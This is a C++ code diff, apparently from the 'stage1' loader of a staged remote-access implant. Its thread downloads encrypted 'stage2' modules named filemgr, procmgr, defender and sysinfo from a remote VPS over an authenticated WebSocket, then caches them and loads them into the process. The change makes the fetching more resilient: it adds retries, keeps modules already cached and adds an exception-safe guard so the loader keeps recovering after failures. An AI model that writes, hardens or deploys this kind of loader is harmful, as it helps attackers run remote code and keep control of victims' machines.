@@ -355,21 +355,67 @@ public:
         }
         stage1_log(1, "stage2: prefetch_all_async starting");
         std::thread([this]{
-            wipe_cache_dir();
-            static const char* kModules[] = { "filemgr", "procmgr", "defender", "sysinfo" };
-            for (auto m : kModules) {
-                std::string name = m;
-                stage1_log(1, ("stage2: prefetch begin " + name).c_str());
-                bool fetched = fetch_blob_sync(m, 15000);
-                stage1_log(1, ("stage2: prefetch fetch_blob_sync " + name +
-                              " -> " + (fetched ? "OK" : "FAIL")).c_str());
-                if (!fetched) continue;
-                bool loaded = ensure_loaded(m);
-                stage1_log(1, ("stage2: prefetch ensure_loaded " + name +
-                              " -> " + (loaded ? "OK" : "FAIL")).c_str());
+            // RAII guard: even if an exception escapes the loop, flip the
+            // running-flag back off so the 60 s retry loop in main.cpp can
+            // kick again. Previously a throw inside fetch_blob_sync left
+            // prefetch_running_ stuck at true forever — every retry saw
+            // "already running, skipping" and the host never recovered
+            // from a single early failure.
+            struct RunGuard {
+                std::atomic<bool>& flag;
+                ~RunGuard() { flag.store(false); }
+            } _guard{ prefetch_running_ };
+
+            try {
+                // Do NOT wipe the cache every time: previous runs may have
+                // successfully cached 3 of 4 modules and we should NOT
+                // throw those away just because one failed. Cache is already
+                // keyed by module name so stale/old blobs won't be silently
+                // mixed with new ones (aes-gcm decrypt fails on stale keys,
+                // then the file is re-fetched).
+                //
+                // wipe_cache_dir() is still called at service startup via
+                // shutdown_all() and at install/uninstall time by the .bat
+                // scripts, which is the correct moment to clear stale data.
+
+                static const char* kModules[] = { "filemgr", "procmgr", "defender", "sysinfo" };
+                for (auto m : kModules) {
+                    std::string name = m;
+                    // Skip modules already loaded — no point re-fetching a blob
+                    // we already have cached and Stage2Init'd.
+                    {
+                        std::lock_guard<std::recursive_mutex> lk(mu_);
+                        if (modules_.count(name)) {
+                            stage1_log(0, ("stage2: prefetch skip (loaded) " + name).c_str());
+                            continue;
+                        }
+                    }
+
+                    // Per-module retry (2 attempts, 8s each) — VPS sometimes
+                    // flakes the first stage2_fetch right after a fresh WSS
+                    // auth; second try 500ms later almost always succeeds.
+                    bool fetched = false;
+                    for (int attempt = 0; attempt < 2 && !fetched; ++attempt) {
+                        if (attempt > 0) std::this_thread::sleep_for(std::chrono::milliseconds(500));
+                        stage1_log(1, ("stage2: prefetch begin " + name + " attempt=" +
+                                       std::to_string(attempt + 1)).c_str());
+                        fetched = fetch_blob_sync(m, 8000);
+                        stage1_log(1, ("stage2: prefetch fetch_blob_sync " + name +
+                                      " -> " + (fetched ? "OK" : "FAIL")).c_str());
+                    }
+                    if (!fetched) continue;
+                    bool loaded = ensure_loaded(m);
+                    stage1_log(1, ("stage2: prefetch ensure_loaded " + name +
+                                  " -> " + (loaded ? "OK" : "FAIL")).c_str());
+                }
+                stage1_log(1, "stage2: prefetch_all_async done");
+            } catch (const std::exception& e) {
+                std::string m = "stage2: prefetch threw: "; m += e.what();
+                stage1_log(3, m.c_str());
+            } catch (...) {
+                stage1_log(3, "stage2: prefetch threw unknown");
             }
-            prefetch_running_.store(false);
-            stage1_log(1, "stage2: prefetch_all_async done");
+            // RunGuard flips prefetch_running_ back to false on return/throw.
         }).detach();
     }
 
